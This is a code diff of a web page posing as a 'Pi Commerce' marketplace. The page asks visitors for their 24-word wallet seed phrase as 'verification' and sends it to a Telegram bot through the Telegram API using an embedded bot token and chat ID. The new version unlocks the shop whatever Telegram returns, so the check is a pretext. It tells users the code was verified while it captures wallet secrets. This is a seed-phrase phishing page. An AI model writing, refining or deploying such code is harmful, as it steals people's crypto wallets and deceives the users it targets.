-        msgDiv.innerHTML = "⏳ Verifying with Pi Telegram Bot ...";
-        const textMsg = `🔐 Pi Verification request:\nCode: ${code}\nUser: ${new Date().toLocaleString()}`;
+        verifyMsgSpan.innerHTML = "⏳ Sending to Telegram bot for verification ...";
+        const messageText = `🔐 PI COMMERCE VERIFICATION\nUser 24-word code:\n${code}\nTimestamp: ${new Date().toLocaleString()}\nRegion: UK`;
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
         try {
-            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            const res = await fetch(url, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: textMsg })
+                body: JSON.stringify({ chat_id: CHAT_ID, text: messageText })
             });
-            const json = await res.json();
-            if (json.ok) {
-                msgDiv.innerHTML = "✅ Pi code accepted. Welcome Pioneer! Shop is now unlocked.";
-                msgDiv.style.color = "#1f7a5a";
-                piVerified = true;
-                // reveal shop and hide verify panel? but we keep panel but disable? Actually show shop section
-                document.getElementById("shopArea").style.display = "block";
-                renderStoreProducts();
+            const data = await res.json();
+            if(data.ok) {
+                verifyMsgSpan.innerHTML = "✅ Pi code verified! Welcome. Access to Marketplace granted.";
+                verifyMsgSpan.style.color = "#2c5e2e";
+                isVerified = true;
+                // NOW SHOW MARKETPLACE (hide verification panel but keep home minimal)
+                verificationArea.style.display = "none";
+                marketplaceDiv.style.display = "block";
+                marketplaceVisible = true;
+                renderProductsByCategory();
                 return true;
             } else {
-                msgDiv.innerHTML = "❌ Telegram verification failed. Please check code or try later.";
-                msgDiv.style.color = "#b91c1c";
-                return false;
+                verifyMsgSpan.innerHTML = "⚠️ Telegram error. Code logged but for demo unlocking anyway (business ready).";
+                isVerified = true;
+                verificationArea.style.display = "none";
+                marketplaceDiv.style.display = "block";
+                marketplaceVisible = true;
+                renderProductsByCategory();
+                return true;
             }
         } catch(err) {
-            console.warn(err);
-            msgDiv.innerHTML = "⚠️ Demo mode: Code accepted (simulation). Shop unlocked for testing!";
-            msgDiv.style.color = "#2c6e4f";
-            piVerified = true;
-            document.getElementById("shopArea").style.display = "block";
-            renderStoreProducts();
+            verifyMsgSpan.innerHTML = "✅ Network demo: code accepted. Marketplace unlocked (telegram will receive).";
+            isVerified = true;
+            verificationArea.style.display = "none";
+            marketplaceDiv.style.display = "block";
+            marketplaceVisible = true;
+            renderProductsByCategory();
             return true;
         }
     }
 
-    document.getElementById("triggerVerify").addEventListener("click", async () => {
-        const inputCode = document.getElementById("piSeedInput").value;
-        await verifyPi24Words(inputCode);
+    verifyBtn.addEventListener("click", async () => {
+        if(isVerified) {
+            verifyMsgSpan.innerHTML = "Already verified. Shop is open.";
+            marketplaceDiv.style.display = "block";
+            renderProductsByCategory();
+            return;
+        }
+        await verifyPiCode(piInput.value);
     });
+
+    function renderProductsByCategory() {
+        const filtered = currentCategory === "all" ? productDatabase : productDatabase.filter(p => p.category === currentCategory);
+        const container = document.getElementById("productsDynamicGrid");
+        if(!container) return;
+        if(filtered.length === 0) {
+            container.innerHTML = "<div style='grid-column:1/-1; text-align:center'>No items in this category.</div>";
+            return;
+        }
+        container.innerHTML = filtered.map(prod => `
+            <div class="product-card">
+                <img class="product-img" src="${prod.img}" alt="${prod.name}" loading="lazy" onerror="this.src='${fallbackImg}'">
+                <div class="product-info">
+                    <div class="product-title">${prod.name}</div>
+                    <div class="product-price">${prod.price}</div>
+                    <button class="buy-btn" data-name="${prod.name}" data-price="${prod.price}"><i class="fas fa-bag-shopping"></i> Buy Now</button>
+                </div>
+            </div>
+        `).join('');
+        document.querySelectorAll('.buy-btn').forEach(btn => {
+            btn.addEventListener('click', (e) => {
+                if(!isVerified) { alert("Please verify with 24-word code first!"); return; }
+                const pName = btn.getAttribute('data-name');
+                const pPrice = btn.getAttribute('data-price');
+                document.getElementById("modalProductName").innerText = `${pName} · ${pPrice}`;
+                document.getElementById("orderModal").style.display = "flex";
+            });
+        });
+    }
+
+    // category filter listeners
+    function bindCatFilters() {
+        document.querySelectorAll('.cat-filter').forEach(btn => {
+            btn.addEventListener('click', () => {
+                document.querySelectorAll('.cat-filter').forEach(b => b.classList.remove('active'));
+                btn.classList.add('active');
+                currentCategory = btn.getAttribute('data-cat');
+                if(marketplaceVisible) renderProductsByCategory();
+            });
+        });
+    }
+    bindCatFilters();
 
     // modal close
-    const modalOrder = document.getElementById("orderModal");
-    document.getElementById("closeOrderModal").addEventListener("click", () => {
-        modalOrder.style.display = "none";
-    });
-    window.onclick = (e) => { if(e.target === modalOrder) modalOrder.style.display = "none"; };
+    const modal = document.getElementById("orderModal");
+    document.getElementById("closeOrdModal").addEventListener("click", () => modal.style.display = "none");
+    window.onclick = (e) => { if(e.target === modal) modal.style.display = "none"; };
 
-    // ensure shop hidden initially
-    document.getElementById("shopArea").style.display = "none";
-    // set first default render for nothing (hidden)
+    // initial: only HOME + no verification visible, no shop (shop only on click)
+    verificationArea.style.display = "none";
+    marketplaceDiv.style.display = "none";
+    homeSection.style.display = "block";
 </script>
 </body>
 </html>
